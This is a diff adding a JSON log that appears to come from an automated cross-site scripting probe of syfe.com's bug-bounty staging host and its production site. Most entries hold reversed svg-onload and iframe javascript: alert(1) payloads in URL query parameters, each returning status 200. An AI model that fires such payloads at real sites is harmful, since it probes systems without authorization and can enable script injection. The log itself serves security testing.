@@ -1,0 +1,74 @@
+[
+  {
+    "vreme": "2025-05-23T06:21:16.617476",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?q=%3E%291%28trela%3Ddaolno%2Fgvs%3C",
+    "status": 200,
+    "payload": ">)1(trela=daolno/gvs<"
+  },
+  {
+    "vreme": "2025-05-23T06:22:36.000255",
+    "url": "https://www.syfe.com?q=%3E%291%28trela%3Ddaolno%2Fgvs%3C",
+    "status": 200,
+    "payload": ">)1(trela=daolno/gvs<"
+  },
+  {
+    "vreme": "2025-05-23T06:31:16.078528",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?query=%3E%291%28trela%3Ddaolno%2Fgvs%3C",
+    "status": 200,
+    "payload": ">)1(trela=daolno/gvs<"
+  },
+  {
+    "vreme": "2025-05-23T06:32:41.882418",
+    "url": "https://www.syfe.com?query=%3E%291%28trela%3Ddaolno%2Fgvs%3C",
+    "status": 200,
+    "payload": ">)1(trela=daolno/gvs<"
+  },
+  {
+    "vreme": "2025-05-23T06:36:59.835931",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?s=%3E%291%28trela%3Ddaolno%2Fgvs%3C",
+    "status": 200,
+    "payload": ">)1(trela=daolno/gvs<"
+  },
+  {
+    "vreme": "2025-05-23T06:38:24.449172",
+    "url": "https://www.syfe.com?input=%3E%291%28trela%3Ddaolno%2Fgvs%3C",
+    "status": 200,
+    "payload": ">)1(trela=daolno/gvs<"
+  },
+  {
+    "vreme": "2025-05-23T06:45:06.855096",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?q=%3E%291%28trela%3Ddaolno%2Fgvs%3C",
+    "status": 200,
+    "payload": ">)1(trela=daolno/gvs<"
+  },
+  {
+    "vreme": "2025-05-23T06:45:37.758951",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?search=%3Eemarfi%2F%3C%3E%27%291%28trela%3Atpircsavaj%27%3Dcrs+emarfi%3C",
+    "status": 200,
+    "payload": ">emarfi/<>')1(trela:tpircsavaj'=crs emarfi<"
+  },
+  {
+    "vreme": "2025-05-23T06:46:31.321885",
+    "url": "https://www.syfe.com?q=%3E%291%28trela%3Ddaolno%2Fgvs%3C",
+    "status": 200,
+    "payload": ">)1(trela=daolno/gvs<"
+  },
+  {
+    "vreme": "2025-05-23T06:47:03.385225",
+    "url": "https://www.syfe.com?input=%3Eemarfi%2F%3C%3E%27%291%28trela%3Atpircsavaj%27%3Dcrs+emarfi%3C",
+    "status": 200,
+    "payload": ">emarfi/<>')1(trela:tpircsavaj'=crs emarfi<"
+  },
+  {
+    "vreme": "2025-05-23T06:49:22.056193",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?query=search%3Dhello",
+    "status": 200,
+    "payload": "search=hello"
+  },
+  {
+    "vreme": "2025-05-23T06:56:09.751191",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?query=search%3Dhello",
+    "status": 200,
+    "payload": "search=hello"
+  }
+]
